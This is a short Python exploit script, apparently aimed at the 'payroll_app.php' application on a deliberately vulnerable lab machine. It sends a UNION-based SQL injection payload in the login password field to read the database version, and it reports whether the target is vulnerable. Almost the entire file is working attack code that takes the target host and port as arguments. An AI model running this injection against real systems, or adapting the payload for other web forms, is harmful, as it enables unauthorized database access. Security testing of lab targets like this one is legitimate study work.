#!/usr/bin/env python3

import requests
import argparse

import logging
log = logging.getLogger(__name__)


class Payroll:
    def __init__(self):
        self.__host = None
        self.__port = 80
        self.__path = "/payroll_app.php"

    def __exploit(self):
        sql = {
            "user": "defcon",
            "password": "' UNION SELECT null,null,null,@@version#",
            "s": "OK",
        }
        check = "5.5.62-0ubuntu0.14.04.1"
        r = requests.post(f"http://{self.__host}:{self.__port}{self.__path}", data=sql)
        if check in r.text:
            log.info("[!] Payroll app is vulnerable")
            return True
        log.info("[!] Payroll app is secure")
        return False

    def run(self, host, port=None):
        self.__host = host
        log.info(f"[*] Exploiting Payroll App ({self.__host})")
        if port:
            self.__port = port
        return self.__exploit()


def main(args):
    log.info("[+] Exploiting payroll_app.php by xentrick")
    log.info("[+] Exploiting " + args.host + ":" + args.port)

    exploit = Payroll()
    if exploit.run(args.host, int(args.port)):
        log.info("Target exploited")
    else:
        log.info("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    main(args)
